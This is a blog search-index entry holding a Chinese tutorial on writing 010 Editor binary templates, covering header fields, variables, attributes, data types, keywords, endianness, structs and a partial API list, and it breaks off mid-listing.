<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>010editor 模板编写笔记</title>
    <url>/2024/11/12/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="010editor-模板编写"><a href="#010editor-模板编写" class="headerlink" title="010editor 模板编写"></a>010editor 模板编写</h1><p>参考文档：<br><a href="https://www.sweetscape.com/010editor/manual/IntroTemplates.htm" target="_blank" rel="noopener">https://www.sweetscape.com/010editor/manual/IntroTemplates.htm</a></p>
<p><a href="https://bbs.pediy.com/thread-257797.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257797.htm</a></p>
<p><a href="https://lyana-nullptr.github.io/2024/07/27/try-the-template-of-010editor/" target="_blank" rel="noopener">https://lyana-nullptr.github.io/2024/07/27/try-the-template-of-010editor/</a></p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>模板文件的开头会有如下信息：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span>      <span class="attr">File:</span> </span><br><span class="line"><span class="string">//</span>   <span class="attr">Authors:</span> </span><br><span class="line"><span class="string">//</span>   <span class="attr">Version:</span> </span><br><span class="line"><span class="string">//</span>   <span class="attr">Purpose:</span> </span><br><span class="line"><span class="string">//</span>  <span class="attr">Category:</span> <span class="string">WeChat</span></span><br><span class="line"><span class="string">//</span> <span class="attr">File Mask:</span> <span class="string">*.wxapkg</span></span><br><span class="line"><span class="string">//</span>  <span class="attr">ID Bytes:</span> <span class="string">BE,</span> <span class="number">56</span> <span class="number">31</span> <span class="string">4D</span> <span class="string">4D</span> <span class="number">57</span> <span class="number">58</span></span><br><span class="line"><span class="string">//</span>   <span class="attr">History:</span></span><br></pre></td></tr></table></figure>
<p>程序会优先用File Mask匹配文件扩展名，再用ID Bytes匹配魔术数，匹配成功的话就会自动加载模板文件。</p>
<a id="more"></a>
<p>默认情况下，所有变量都会显示在模板窗口中。比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> x;</span><br><span class="line">   <span class="keyword">int</span> y;    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x &lt;bgcolor=<span class="number">0x0000FF</span>,format=hex&gt;;</span><br><span class="line"></span><br><span class="line">test a &lt;bgcolor=<span class="number">0x00FFFF</span>&gt;;</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.wonderkun.cc//uploads/note/202411141132637.png" alt=""></p>
<p>可以通过local关键字定义变量，这样的变量默认不会显示在模板窗口中，不过用户任然可以在窗口中点击右键菜单中的Show Local Variables来显示局部变量。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 该模板中定义了变量 a, b, c, d, e, f, g</span></span><br><span class="line"><span class="comment">// 枚举的变量类型为 “enum ENUM1 &#123; COMP_1 = 1, COMP_2 = 2, COMP_3 = 3 &#125;” 整体，结构体同理</span></span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">float</span> b;</span><br><span class="line"><span class="built_in">double</span> c;</span><br><span class="line"><span class="built_in">string</span> d;</span><br><span class="line"><span class="built_in">int</span> e[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">enum</span> ENUM1 &#123; COMP_1 = <span class="number">1</span>, COMP_2 = <span class="number">2</span>, COMP_3 = <span class="number">3</span> &#125; f;</span><br><span class="line">struct STRUCT1 &#123; <span class="built_in">int</span> x; <span class="built_in">int</span> y; <span class="built_in">int</span> z; &#125; g;</span><br></pre></td></tr></table></figure>
<p>重复定义同名的变量将被视作定义一个数组变量，也可以通过循环语句和定义变量语句组合实现。如：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法 1，显示为：</span></span><br><span class="line"><span class="comment">// Name    Value   Start   Size    Type    Color   Comment</span></span><br><span class="line"><span class="comment">// a[0]    ...     0h      4h      int</span></span><br><span class="line"><span class="comment">// a[1]    ...     4h      4h      int</span></span><br><span class="line"><span class="comment">// a[2]    ...     8h      4h      int</span></span><br><span class="line"><span class="built_in">int</span> a[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法 2，效果相同</span></span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法 3，效果相同</span></span><br><span class="line">local <span class="built_in">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>变量属性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt; format=hex|decimal|octal|binary,</span><br><span class="line">   fgcolor=&lt;color&gt;|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   bgcolor=&lt;color&gt;|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   style=&lt;style_name&gt;,</span><br><span class="line">   comment=<span class="string">"&lt;string&gt;"</span>|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   name=<span class="string">"&lt;string&gt;"</span>|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   <span class="built_in">open</span>=<span class="literal">true</span>|<span class="literal">false</span>|suppress,</span><br><span class="line">   hidden=<span class="literal">true</span>|<span class="literal">false</span>,</span><br><span class="line">   <span class="built_in">read</span>=&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   <span class="built_in">write</span>=&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   <span class="built_in">size</span>=&lt;number&gt;|&lt;function&gt;|(&lt;expression&gt;),</span><br><span class="line">   optimize=<span class="literal">true</span>|<span class="literal">false</span>,</span><br><span class="line">   disasm=&lt;constant&gt;|&lt;function&gt;|(&lt;expression&gt;) &gt;</span><br></pre></td></tr></table></figure>

<p>format: 以某种进制格式显示，默认为十进制，显示在 Vlaue 栏<br>fgcolor: 设置字体色<br>bgcolor: 设置背景色<br>comment: 添加注释，显示在 Comment 栏<br>name: 替换显示的字符，默认为结构体中的变量名，显示在 Name 栏<br>open: 设置树形图是否展开，默认不展开<br>hidden: 设置是否隐藏，默认为不隐藏<br>read: 读回调，返回字符串并显示在 Vlaue 栏<br>write: 写回调，将读回调返回的字符写入结构体某个字段中<br>size: 按需执行，可节约系统内存</p>
<p>一些颜色值 ：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">cBlack - <span class="number">0x000000</span></span><br><span class="line">cRed - <span class="number">0x0000ff</span></span><br><span class="line">cDkRed - <span class="number">0x000080</span></span><br><span class="line">cLtRed - <span class="number">0x8080ff</span></span><br><span class="line">cGreen - <span class="number">0x00ff00</span></span><br><span class="line">cDkGreen - <span class="number">0x008000</span></span><br><span class="line">cLtGreen - <span class="number">0x80ff80</span></span><br><span class="line">cBlue - <span class="number">0xff0000</span></span><br><span class="line">cDkBlue - <span class="number">0x800000</span></span><br><span class="line">cLtBlue - <span class="number">0xff8080</span></span><br><span class="line">cPurple - <span class="number">0xff00ff</span></span><br><span class="line">cDkPurple - <span class="number">0x800080</span></span><br><span class="line">cLtPurple - <span class="number">0xffe0ff</span></span><br><span class="line">cAqua - <span class="number">0xffff00</span></span><br><span class="line">cDkAqua - <span class="number">0x808000</span></span><br><span class="line">cLtAqua - <span class="number">0xffffe0</span></span><br><span class="line">cYellow - <span class="number">0x00ffff</span></span><br><span class="line">cDkYellow - <span class="number">0x008080</span></span><br><span class="line">cLtYellow - <span class="number">0x80ffff</span></span><br><span class="line">cDkGray - <span class="number">0x404040</span></span><br><span class="line">cGray - <span class="number">0x808080</span>,</span><br><span class="line">cSilver - <span class="number">0xc0c0c0</span>,</span><br><span class="line">cLtGray - <span class="number">0xe0e0e0</span></span><br><span class="line">cWhite - <span class="number">0xffffff</span></span><br><span class="line">cNone - <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure>


<p>帮助大伙更好的理解以上这几个特殊的属性，图 1 中的 1 处是 name 属性显示的字符，如果不指定 name 属性默认就是结构体中的变量名。2 处是 format 属性，默认是十进制，这里指定为 16 进制。3 处是背景颜色和字体颜色缩影，这里没设置颜色所以显示为空。4 处就是 comment 属性显示的位置。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202411141241455.png" alt=""></p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>8字节 char byte CHAR BYTE uchar ubyte UCHAR UBYTE<br>16字节 short int16 SHORT INT16 ushort uint16 USHORT UINT16 WORD<br>32字节 int int32 long INT INT32 LONG uint uint32 ulong UINT UINT32 ULONG DWORD<br>64字节 int64 quad QUAD INT64 __int64 uint64 uquad UQUAD UINT64 __uint64 QWORD<br>浮点 float FLOAT double DOUBLE hfloat HFLOAT<br>其他 DOSDATE DOSTIME FILETIME OLETIME time_t</p>
<p>使用:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> MYENUM &#123; COMP_1, COMP_2 = <span class="number">5</span>, COMP_3 &#125; var1;</span><br><span class="line"><span class="keyword">enum</span> &lt;ushort&gt; MYENUM &#123; COMP_1, COMP_2 = <span class="number">5</span>, COMP_3 &#125; var1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> myArray[<span class="number">15</span>];</span><br><span class="line"><span class="keyword">int</span> myArray[ FileSize() - myInt * <span class="number">0x10</span> + (<span class="number">17</span> &lt;&lt; <span class="number">5</span>) ];<span class="comment">//大小可以是变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">15</span>] = <span class="string">"First"</span>;  </span><br><span class="line"><span class="built_in">string</span> s = <span class="string">"Second"</span>;  </span><br><span class="line"><span class="built_in">string</span> r1 = str + s;  </span><br><span class="line"><span class="built_in">string</span> r2 = str;  </span><br><span class="line">r2 += s;  </span><br><span class="line"><span class="keyword">return</span> (r1 == r2);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 宽字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">wchar_t</span> str1[<span class="number">15</span>] = <span class="string">L"How now"</span>;  </span><br><span class="line"><span class="built_in">wstring</span> str2 = <span class="string">"brown cow"</span>;  </span><br><span class="line"><span class="built_in">wstring</span> str3 = str1 + <span class="string">L' '</span> + str2 + <span class="string">L'?'</span></span><br></pre></td></tr></table></figure>

<h3 id="控制语句和函数"><a href="#控制语句和函数" class="headerlink" title="控制语句和函数"></a>控制语句和函数</h3><p>支持 for,if,while,switch</p>
<p>函数参数可以通过值或引用传递，010editor脚本不支持指针，但是可以用[]表示数组<br>程序中不需要main函数，代码从第一行开始执行
 </p>
<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>sizeof<br>startof 用于计算变量起始地址</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">SetCursorPos( <span class="name">startof</span>( <span class="name">lines</span>[<span class="number">0</span>] ) )<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>exists 检查某变量是否声明</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i;  </span><br><span class="line"><span class="keyword">string</span> s;  </span><br><span class="line"><span class="keyword">while</span>( <span class="keyword">exists</span>( <span class="keyword">file</span>[i] ) )  </span><br><span class="line">&#123;  </span><br><span class="line">s = <span class="keyword">file</span>[i].frFileName;  </span><br><span class="line">Printf( <span class="string">"%s\n"</span>, s );  </span><br><span class="line">i++;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>function_exists 检查函数是否定义</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">( function_exists(CopyStringToClipboard)</span></span> )  </span><br><span class="line">&#123;  </span><br><span class="line">...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>this 引用当前结构体</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">void <span class="constructor">PrintHeader( <span class="params">struct</span> HEADER &amp;<span class="params">h</span> )</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID1 = %d\n"</span>, <span class="params">h</span>.ID1 )</span>;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID2 = %d\n"</span>, <span class="params">h</span>.ID2 )</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">struct</span> HEADER  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">int</span> ID1;  </span><br><span class="line"><span class="built_in">int</span> ID2;  </span><br><span class="line"><span class="constructor">PrintHeader( <span class="params">this</span> )</span>;  </span><br><span class="line">&#125; h1;</span><br></pre></td></tr></table></figure>

<p>parentof 访问包含变量的结构和union</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">void <span class="constructor">PrintHeader( <span class="params">struct</span> HEADER &amp;<span class="params">h</span> )</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID1 = %d\n"</span>, <span class="params">h</span>.ID1 )</span>;  </span><br><span class="line"><span class="constructor">Printf( <span class="string">"ID2 = %d\n"</span>, <span class="params">h</span>.ID2 )</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">struct</span> HEADER  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">int</span> ID1;  </span><br><span class="line"><span class="built_in">int</span> ID2;  </span><br><span class="line"><span class="keyword">struct</span> SUBITEM  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">int</span> data1;  </span><br><span class="line"><span class="built_in">int</span> data2;  </span><br><span class="line"><span class="constructor">PrintHeader( <span class="params">parentof</span>(<span class="params">this</span>)</span> );  </span><br><span class="line">&#125; item1;  </span><br><span class="line"><span class="constructor">PrintHeader( <span class="params">parentof</span>(<span class="params">item1</span>)</span> );  </span><br><span class="line">&#125; h1;</span><br></pre></td></tr></table></figure>



<h2 id="大小端以及其他设置"><a href="#大小端以及其他设置" class="headerlink" title="大小端以及其他设置"></a>大小端以及其他设置</h2><p>默认随系统，比如在 Windows 下是按照小端模式，通过BigEndian和LittleEndian来调整读取方式。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">BigEndian()</span>;    <span class="comment">// 转换为大端模式</span></span><br><span class="line"><span class="built_in">int</span> x;</span><br><span class="line"><span class="constructor">LittleEndian()</span>; <span class="comment">// 转换为小端模式</span></span><br></pre></td></tr></table></figure>

<ul>
<li>color设置</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> id &lt;fgcolor=cBlack, bgcolor=<span class="number">0x0000FF</span>&gt;;  </span><br><span class="line"><span class="constructor">SetForeColor( <span class="params">cRed</span> )</span>;  </span><br><span class="line"><span class="built_in">int</span> first; <span class="comment">// will be colored red  </span></span><br><span class="line"><span class="built_in">int</span> second; <span class="comment">// will be colored red  </span></span><br><span class="line"><span class="constructor">SetForeColor( <span class="params">cNone</span> )</span>;  </span><br><span class="line"><span class="built_in">int</span> third; <span class="comment">// will not be colored</span></span><br></pre></td></tr></table></figure>


<h2 id="脚本终止"><a href="#脚本终止" class="headerlink" title="脚本终止"></a>脚本终止</h2><p>如果在执行过程中发现脚本结构不对时可以提前结束，使用return语句即可，我们把整个脚本文件看作是一个C函数，用return就可以提前退出函数。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> magic = ReadString(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (magic == <span class="string">"Hello"</span>) &#123;</span><br><span class="line">  Printf(<span class="string">"无法解析加密文件"</span>);</span><br><span class="line"><span class="built_in">  return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结构体扩展"><a href="#结构体扩展" class="headerlink" title="结构体扩展"></a>结构体扩展</h2><h3 id="结构体构造函数"><a href="#结构体构造函数" class="headerlink" title="结构体构造函数"></a>结构体构造函数</h3><figure class="highlight d"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> (<span class="built_in">uint</span> offset) &#123;</span><br><span class="line">  <span class="built_in">uint</span> x;</span><br><span class="line">&#125; FILE;</span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FILE</span> <span class="built_in">f</span>(123);</span><br></pre></td></tr></table></figure>

<h3 id="结构体表达式"><a href="#结构体表达式" class="headerlink" title="结构体表达式"></a>结构体表达式</h3><p>有时候结构体不是固定长度，而是根据字段的值来决定的</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  FILE_NAME fileName<span class="comment">;</span></span><br><span class="line">  uint offset<span class="comment">;</span></span><br><span class="line">  uint size<span class="comment">;</span></span><br><span class="line">  </span><br><span class="line">  if (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    local int64 pos = FTell()<span class="comment">;</span></span><br><span class="line">    FSeek(offset)<span class="comment">;</span></span><br><span class="line">    uchar data[size]<span class="comment">;</span></span><br><span class="line">    FSeek(pos)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125; FILE_INFO &lt;comment=fileName.fileName&gt;<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>甚至可以直接按照下面写法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> length;       <span class="comment">// 读取长度字段（4 字节）</span></span><br><span class="line">    local <span class="keyword">unsigned</span> <span class="keyword">int</span> c = length +<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> data[c];   <span class="comment">// 读取长度为 length 的字符串</span></span><br><span class="line">&#125; MyData;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化结构，以便解析文件</span></span><br><span class="line">MyData myData;</span><br></pre></td></tr></table></figure>

<h2 id="当前地址"><a href="#当前地址" class="headerlink" title="当前地址"></a>当前地址</h2><p>当前地址是下一个被定义变量的起始地址，初始为 0h，每定义一个变量，当前地址将会后移该变量的大小（通常用十六进制表示）</p>
<p>FTell() 函数用于获取当前地址，FSeek() 函数用于修改当前地址，FSkip() 函数用于移动当前地址，使用这些函数的组合<br>可以实现不按序读取数据。</p>
<p>使用 ReadInt()、ReadByte() 等读取函数配合 FTell() 等函数可以从当前地址开始读取一段符合类型的值,这几个函数不会影响当前地址，常在条件语句中<br>用作判断，例如：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从当前地址开始读取一段 int 值，且这个值为 1 时，将会定义结构体变量 opt1，类型为 OPTION1</span></span><br><span class="line"><span class="comment">// 否则将会定义结构体变量 opt2，类型为 OPTION2</span></span><br><span class="line"><span class="keyword">struct</span> <span class="type">OPTION1</span> &#123; int tag; uchar data[<span class="number">8</span>]; &#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="type">OPTION2</span> &#123; int tag; uint64 data; &#125;;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">ReadInt</span>( <span class="built_in">FTell</span>() ) == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">struct</span> <span class="type">OPTION1</span> opt1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="type">OPTION2</span> opt2;</span><br></pre></td></tr></table></figure>

<h2 id="常用api"><a href="#常用api" class="headerlink" title="常用api"></a>常用api</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">void <span class="constructor">BigEndian()</span></span><br><span class="line">void <span class="constructor">LittleEndian()</span></span><br><span class="line"><span class="built_in">char</span> <span class="constructor">ReadByte(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">uchar <span class="constructor">ReadUByte(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">short <span class="constructor">ReadShort(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">ushort <span class="constructor">ReadUShort(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadInt(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">uint <span class="constructor">ReadUInt(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">ReadInt64(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">uint64 <span class="constructor">ReadUInt64(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">void <span class="constructor">ReadBytes(<span class="params">uchar</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">n</span>)</span></span><br><span class="line"><span class="built_in">char</span><span class="literal">[]</span> <span class="constructor">ReadString(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadStringLength(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line">wstring <span class="constructor">ReadWString(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadWStringLength(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line">void <span class="constructor">WriteByte(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">char</span> <span class="params">value</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSeek(<span class="params">int64</span> <span class="params">pos</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSkip(<span class="params">int64</span> <span class="params">offset</span>)</span></span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">FTell()</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FEof()</span></span><br><span class="line">void <span class="constructor">Strcpy(<span class="params">char</span> <span class="params">dest</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">src</span>[])</span></span><br><span class="line">void <span class="constructor">Strcat(<span class="params">char</span> <span class="params">dest</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">src</span>[])</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Strchr(<span class="params">const</span> <span class="params">char</span> <span class="params">s</span>[], <span class="params">char</span> <span class="params">c</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Strcmp(<span class="params">const</span> <span class="params">char</span> <span class="params">s1</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">s2</span>[])</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Printf(<span class="params">const</span> <span class="params">char</span> <span class="params">format</span>[] [, <span class="params">argument</span>, <span class="operator">...</span> ])</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">SScanf(<span class="params">char</span> <span class="params">str</span>[], <span class="params">char</span> <span class="params">format</span>[], <span class="operator">...</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">SPrintf(<span class="params">char</span> <span class="params">buffer</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">format</span>[] [, <span class="params">argument</span>, <span class="operator">...</span> ])</span></span><br></pre></td></tr></table></figure>

<p>io函数</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"> void <span class="constructor">BigEndian()</span><span class="comment">//设置大小头端  </span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">IsBigEndian()</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">IsLittleEndian()</span>  </span><br><span class="line">void <span class="constructor">LittleEndian()</span>  </span><br><span class="line">  </span><br><span class="line">double <span class="constructor">ConvertBytesToDouble( <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span> <span class="comment">//数据转换  </span></span><br><span class="line"><span class="built_in">float</span> <span class="constructor">ConvertBytesToFloat( <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span>   </span><br><span class="line">hfloat <span class="constructor">ConvertBytesToHFloat( <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ConvertDataToBytes( <span class="params">data_type</span> <span class="params">value</span>, <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span>  </span><br><span class="line">void <span class="constructor">DeleteBytes( <span class="params">int64</span> <span class="params">start</span>, <span class="params">int64</span> <span class="params">size</span> )</span><span class="comment">//删除数据  </span></span><br><span class="line">void <span class="constructor">InsertBytes( <span class="params">int64</span> <span class="params">start</span>, <span class="params">int64</span> <span class="params">size</span>, <span class="params">uchar</span> <span class="params">value</span>=0 )</span><span class="comment">//插入数据  </span></span><br><span class="line">void <span class="constructor">OverwriteBytes( <span class="params">int64</span> <span class="params">start</span>, <span class="params">int64</span> <span class="params">size</span>, <span class="params">uchar</span> <span class="params">value</span>=0 )</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">char</span> <span class="constructor">ReadByte( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> ) <span class="comment">//读取数据  </span></span><br><span class="line">double <span class="constructor">ReadDouble( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">float</span> <span class="constructor">ReadFloat( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">hfloat <span class="constructor">ReadHFloat( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadInt( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">ReadInt64( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">ReadQuad( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">short <span class="constructor">ReadShort( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )  </span><br><span class="line">uchar <span class="constructor">ReadUByte( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">uint <span class="constructor">ReadUInt( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">uint64 <span class="constructor">ReadUInt64( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">uint64 <span class="constructor">ReadUQuad( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">ushort <span class="constructor">ReadUShort( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )  </span><br><span class="line">void <span class="constructor">ReadBytes( <span class="params">uchar</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">n</span> )</span>  </span><br><span class="line"><span class="built_in">char</span><span class="literal">[]</span> <span class="constructor">ReadString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadStringLength( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line">wstring <span class="constructor">ReadWString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadWStringLength( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line">wstring <span class="constructor">ReadWLine( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line"><span class="built_in">char</span><span class="literal">[]</span> <span class="constructor">ReadLine( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line">  </span><br><span class="line">void <span class="constructor">WriteByte( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">char</span> <span class="params">value</span> )</span> <span class="comment">//写入数据  </span></span><br><span class="line">void <span class="constructor">WriteDouble( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">double</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteFloat( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">float</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteHFloat( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">float</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteInt( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteInt64( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteQuad( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteShort( <span class="params">int64</span> <span 